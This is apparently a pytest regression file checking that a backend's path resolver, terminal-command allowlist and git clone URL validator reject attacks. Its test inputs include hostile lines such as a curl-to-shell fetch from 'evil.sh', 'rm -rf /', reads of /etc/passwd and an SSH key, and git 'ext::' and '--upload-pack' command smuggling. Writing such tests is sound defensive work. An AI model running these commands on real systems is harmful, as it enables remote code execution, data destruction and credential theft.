"""P0 security hardening regression tests (dependency-light, no server needed).

Run:  python -m pytest backend/tests/test_p0_security.py -q
  or: python backend/tests/test_p0_security.py
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))

from backend.core.security import (  # noqa: E402
    resolve_within,
    validate_terminal_command,
    validate_clone_url,
)


def test_blocks_parent_traversal():
    with tempfile.TemporaryDirectory() as ws:
        try:
            resolve_within(ws, "../../etc/passwd")
            raise AssertionError("traversal was allowed")
        except PermissionError:
            pass


def test_blocks_sibling_prefix_confusion():
    # Classic bug: root="/app/workspace" must NOT let "/app/workspace-evil" through
    # the way `abspath(root) + startswith` did.
    parent = tempfile.mkdtemp()
    ws = os.path.join(parent, "workspace")
    evil = os.path.join(parent, "workspace-evil")
    os.makedirs(ws); os.makedirs(evil)
    secret = os.path.join(evil, "secret.txt")
    open(secret, "w").write("x")
    try:
        resolve_within(ws, os.path.relpath(secret, ws))
        raise AssertionError("sibling-prefix escape was allowed")
    except PermissionError:
        pass


def test_blocks_symlink_escape():
    parent = tempfile.mkdtemp()
    ws = os.path.join(parent, "ws"); os.makedirs(ws)
    outside = os.path.join(parent, "outside"); os.makedirs(outside)
    open(os.path.join(outside, "s.txt"), "w").write("secret")
    link = os.path.join(ws, "link")
    try:
        os.symlink(outside, link)
    except (OSError, NotImplementedError):
        return  # symlinks unsupported (e.g. Windows non-admin) — skip
    try:
        resolve_within(ws, os.path.join("link", "s.txt"))
        raise AssertionError("symlink escape was allowed")
    except PermissionError:
        pass


def test_allows_legit_path():
    with tempfile.TemporaryDirectory() as ws:
        f = os.path.join(ws, "sub", "a.py")
        os.makedirs(os.path.dirname(f)); open(f, "w").close()
        out = resolve_within(ws, os.path.relpath(f, ws))
        assert out == os.path.realpath(f)


def test_terminal_blocks_operator_chaining():
    # The exact bypass the old prefix-whitelist allowed:
    argv, err = validate_terminal_command("pytest && curl http://evil.sh | sh")
    assert argv is None and "operator" in err.lower()


def test_terminal_blocks_semigrep_chaining():
    argv, err = validate_terminal_command("pytest ; rm -rf /")
    assert argv is None


def test_terminal_blocks_leading_dash():
    argv, err = validate_terminal_command("-friday")
    assert argv is None and "leading dash" in err.lower()


def test_terminal_allows_plain_and_flagged():
    argv, err = validate_terminal_command("pytest")
    assert argv == ["pytest"] and err is None
    argv, err = validate_terminal_command("python -m pytest -q --maxfail=3")
    assert argv == ["python", "-m", "pytest", "-q", "--maxfail=3"] and err is None


def test_terminal_rejects_non_allowlisted():
    argv, err = validate_terminal_command("ls -la")
    assert argv is None and "allowlist" in err.lower()


def test_clone_blocks_file_scheme():
    try:
        validate_clone_url("file:///home/user/.ssh/id_rsa")
        raise AssertionError("file:// was allowed")
    except ValueError:
        pass


def test_clone_blocks_ext_transport():
    try:
        validate_clone_url("ext::sh -c 'touch /tmp/pwned'")
        raise AssertionError("ext:: transport was allowed")
    except ValueError:
        pass


def test_clone_sanitizes_name():
    url, name = validate_clone_url("https://github.com/foo/bar.git")
    assert url and name == "bar"
    url, name = validate_clone_url("https://github.com/foo/../../etc")
    assert "/" not in name and ".." not in name and name == "etc"


def test_clone_blocks_leading_dash():
    try:
        validate_clone_url("--upload-pack=touch /tmp/x https://github.com/a/b")
        raise AssertionError("leading-dash URL was allowed")
    except ValueError:
        pass


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
    failed = 0
    for t in tests:
        try:
            t()
            print(f"PASS  {t.__name__}")
        except Exception as e:
            failed += 1
            print(f"FAIL  {t.__name__}: {e}")
    print(f"\n{len(tests) - failed}/{len(tests)} passed")
    sys.exit(1 if failed else 0)
